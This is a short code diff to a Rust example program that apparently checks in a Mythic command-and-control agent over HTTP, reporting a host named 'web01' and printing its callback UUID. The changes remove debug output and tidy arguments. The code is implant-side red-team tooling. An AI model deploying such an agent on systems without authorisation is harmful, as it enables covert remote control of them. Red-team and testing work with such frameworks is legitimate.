@@ -60,7 +60,6 @@ fn main() {
     {
         let c2 = HttpC2 { key_b64: None };
         let mut agent = MythicAgent::new(payload_uuid);
-        agent.debug = true;
 
         let req = ReqCheckin::new(
             payload_uuid,
@@ -70,15 +69,9 @@ fn main() {
             Some("web01".into()),
             Some(1337),
             Some("x86_64".into()),
-            None, // domain
-            None, // integrity_level
-            None, // external_ip
-            None, // encryption_key
-            None, // decryption_key
-            None, // process_name
+            None, None, None, None, None, None,
         );
         agent.checkin(req, &c2).unwrap();
-        println!("{}", agent.debug_dump());
         println!("Plaintext callback UUID: {}", agent.callback_uuid());
     }
 
